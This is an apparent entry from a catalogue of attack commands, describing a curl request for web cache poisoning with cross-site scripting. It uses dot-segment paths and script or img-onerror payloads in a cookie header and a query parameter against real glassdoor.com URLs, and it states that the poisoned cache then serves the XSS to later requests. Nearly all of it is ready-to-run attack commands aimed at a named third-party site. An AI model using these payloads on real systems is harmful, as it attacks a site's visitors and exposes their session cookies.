---
id: cmd-curl-poison-xss
data: >-
  curl -H "Cookie: test=\"<script>alert(document.cookie)</script>\""
  "https://glassdoor.com/Job/../Award/some-award?param=\"<script>alert(document.cookie)</script>\""
  -v
tags:
  - poisoning
  - xss
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:55.686Z'
verified: false
validated: true
submitted: true
---
# curl-poison-cache-xss

## Command

```bash
curl -H "Cookie: test=\"<script>alert(document.cookie)</script>\"" "https://glassdoor.com/Job/../Award/some-award?param=\"<script>alert(document.cookie)</script>\"" -v
```

## Description

Sends a crafted request to poison the cache with XSS payload using dot segments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Cookie: ..."` | XSS in cookie | Yes |
| URL with /../ and ?param | Dot segments and param payload | Yes |
| `-v` | Verbose | Yes |

## Examples

### Basic Usage

```bash
curl -H "Cookie: test=\"<script>alert(document.cookie)</script>\"" "https://glassdoor.com/Job/../Award/some-award?param=\"<script>alert(document.cookie)</script>\"" -v
```

### Advanced Usage

```bash
curl -H "Cookie: test=\"<img src=x onerror=alert(document.cookie)>\"" "https://glassdoor.com/mz-survey/interview/collectQuestions_input.htm/../List/some-list?param=\"<img src=x onerror=alert(document.cookie)>\"" -v
```

## Expected Output

Cache poisoned; subsequent requests serve XSS.

## Related

- [[Related Procedure: Construct-Cache-Poisoning-Payload-for-XSS]]
